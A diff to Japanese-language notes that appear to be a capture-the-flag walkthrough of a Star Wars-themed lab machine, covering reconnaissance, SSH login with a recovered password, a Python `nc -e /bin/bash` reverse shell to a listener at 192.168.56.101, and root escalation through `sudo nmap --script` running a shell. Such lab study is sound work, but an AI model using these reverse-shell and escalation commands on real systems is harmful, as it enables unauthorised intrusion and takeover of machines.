@@ -8,19 +8,23 @@
 - nmap
   - 22,80 
 - サイトを見る
-  - ソースに暗号みたいのがあって、これを解読するとURLになっていて、ステガノグラフィをするとパスワードが出てくるが、ここでは出てこないので書いておくと`babyYoda123`
+  - ソースに暗号みたいのがあって、これを解読しても意味ないラビットホールになっている。
+  - yoda.pngの画像をステガノグラフィをするとパスワードが出てくるが、ここでは出てこないので書いておくと`babyYoda123`
 - gobusterする
-  - robots.txt,adminが出てくる。javascriptという気になるのもある
-  - もう一度gobusterでオプション`-x js`をつける
+  - robots.txt,adminが出てくる。javascriptという気になるのもある。このサイトはjavascriptでできているので、拡張子のjsをつけて、もう一度gobusterでオプション`-x js`をつける
   - users.jsが見つかる
-- users.jsを見ると、hanとskywalkerが出てくる
+- users.jsを見ると、hanとskywalkerが記述してあるだけ
 - ssh
+  - han,skywalkerの両方でやってみるが、hanで侵入できる
   - `ssh han@$IP` password:babyYoda123
 - id
   - hanのみで特に目立ったのない 
 - ユーザをチェック
   - `ls /home`
   - Darth,han,skywalkerが見つかる
+- groupチェック
+  - `cat /etc/group` anakinというグループがある
+  - `find / -group anakin 2>/dev/null` evil.pyというのがある 
 - `sudo -l`
   - 使えない 
 - SUID
@@ -49,10 +53,17 @@ import os
 os.system("nc -e /bin/bash 192.168.56.101 9001")
 ```
 
+- コードの説明
+  - ncコマンドで接続する。-eオプションは接続後に実行するコマンド
+  - `/bin/bash -i`にしたら、プロンプトが返ってくると思ったが、そもそも接続できなかった
+
 - Darthになる
   - nc -nlvp 9001で待ち受ける
+- reverse-shellが返ってくる
+  - プロンプトがないので、対話型シェルにする  
 - `sudo -l`
   - nmapがsudoで使える
 - rootになる 
   - `echo "os.execute('/bin/sh')" > /tmp/root.nse`
   - `sudo nmap --script=/tmp/root.nse`
+    - `--script`にはコマンドを書いたファイルを置くことができる。そしてnmapを起動したらファイルが実行される 
